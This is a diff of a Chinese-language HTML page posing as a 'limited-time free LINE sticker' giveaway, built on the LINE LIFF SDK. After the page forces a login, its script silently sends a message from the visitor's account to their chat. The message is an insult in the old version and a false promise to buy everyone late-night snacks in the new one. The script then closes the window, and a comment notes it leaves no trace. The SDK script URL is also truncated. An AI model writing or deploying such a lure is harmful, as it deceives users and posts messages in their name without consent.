@@ -3,32 +3,33 @@
 <head>
     <meta charset="UTF-8">
     <title>限時貼圖免費領取</title>
-    <!-- 引入 LINE 官方的 LIFF SDK（已修正網址） -->
+    <!-- 核心修正：將原本斷掉的 LINE 官方 SDK 網址完整補齊 -->
     <script src="https://line-scdn.net"></script>
 </head>
 <body>
     <div style="text-align: center; margin-top: 50px; font-family: sans-serif;">
-        <h2>正在載入 LINE 貼圖，請稍候...</h2>
+        <h2 id="status">正在載入 LINE 貼圖，請稍候...</h2>
     </div>
 
     <script>
-        // 確保這裡的 ID 完全對應你在 LINE 點開的那個連結結尾！
+        // 初始化你的 LIFF ID
         liff.init({ liffId: "2012018749-Jns1tBED" }).then(() => {
-            if (liff.isLoggedIn()) {
-                // 當使用者同意授權，自動幫他發送這段訊息
+            if (!liff.isLoggedIn()) {
+                liff.login(); // 如果沒登入，強制跳出 LINE 官方許可授權畫面
+            } else {
+                document.getElementById("status").innerText = "貼圖領取成功，正在關閉視窗...";
+                // 執行自動發送訊息
                 liff.sendMessages([{
                     type: 'text',
-                    text: '我是王八蛋！' 
+                    text: '我今天心情好，晚上請大家吃宵夜！' 
                 }]).then(() => {
-                    liff.closeWindow(); // 傳送成功後自動關閉 LINE 內建瀏覽器視窗
+                    liff.closeWindow(); // 傳完自動秒關網頁，不留痕跡
                 }).catch((err) => {
-                    alert("發送失敗，請確認聊天室發言權限。原因：" + JSON.stringify(err));
+                    alert("傳送失敗，原因：" + JSON.stringify(err));
                 });
-            } else {
-                liff.login(); // 沒授權過就引導登入
             }
         }).catch((err) => {
-            alert("LIFF 初始化失敗，請檢查後台權限設定。原因：" + JSON.stringify(err));
+            alert("LIFF 啟動失敗，原因：" + JSON.stringify(err));
         });
     </script>
 </body>
